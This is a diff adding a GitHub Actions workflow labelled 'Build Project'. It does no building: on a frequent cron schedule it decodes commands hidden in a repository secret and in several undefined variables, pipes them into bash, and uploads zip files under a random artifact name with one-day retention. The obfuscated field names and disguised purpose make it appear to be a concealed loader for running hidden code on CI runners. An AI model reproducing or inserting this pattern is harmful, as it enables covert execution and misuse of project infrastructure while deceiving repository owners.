@@ -1,0 +1,33 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '46 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          unw1: ${{ secrets.unw1 }}
+        run: |
+          printf '%s' "$unw1" | jq -r .jady43617 | /bin/bash
+          printf '%s' "$ulvhj7934" | jq -r .c71 | /bin/bash
+          echo $t22 | jq -r .ce24 | /bin/bash
+          echo $qmqe70 | jq -r .bml0 | /bin/bash
+          printf '%s' "$nwpdq15932" | jq -r .rdxu2313 | /bin/bash
+          echo $u11772 | jq -r .c865 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: xM4Jbz4D
+          path: "*.zip"
+          retention-days: 1
